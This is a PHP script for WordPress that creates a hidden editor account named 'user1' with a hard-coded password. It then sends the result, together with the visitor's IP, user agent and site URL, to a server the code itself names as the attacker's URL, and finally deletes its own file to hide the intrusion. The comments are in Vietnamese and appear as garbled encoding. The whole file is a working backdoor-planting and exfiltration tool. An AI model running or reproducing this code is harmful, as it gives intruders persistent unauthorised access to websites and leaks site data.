<?php
require_once('wp-load.php');

$new_user  = 'user1';
$new_pass  = 'user1@12345';
$new_email = 'user1@stealth.com';
$attacker_url = 'http://192.168.85.128:8000/log.php';

ob_start();

if (!username_exists($new_user) && !email_exists($new_email)) {
    $user_id = wp_create_user($new_user, $new_pass, $new_email);
    $user = new WP_User($user_id);
    $user->set_role('editor');

    echo "âœ… Editor user created: {$new_user}<br>";
} else {
    echo "âš ï¸ User already exists.<br>";
}

$result = ob_get_clean();

// ğŸ“¡ Thu tháº­p thÃ´ng tin bá»• sung
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');
$site = site_url();

// ğŸ“¤ Gá»­i log vá» attacker
$log_data = http_build_query([
    'result' => $result,
    'ip' => $ip,
    'agent' => $agent,
    'time' => $time,
    'site' => $site
]);
file_get_contents("{$attacker_url}?{$log_data}");

// âœ… Hiá»ƒn thá»‹ láº¡i ná»™i dung cho trÃ¬nh duyá»‡t
echo $result;

// ğŸ§¹ Tá»± xÃ³a chÃ­nh mÃ¬nh
$self = __FILE__;
if (unlink($self)) {
    echo "ğŸ§¹ Script deleted itself.";
} else {
    echo "âŒ Failed to delete script.";
}
?>
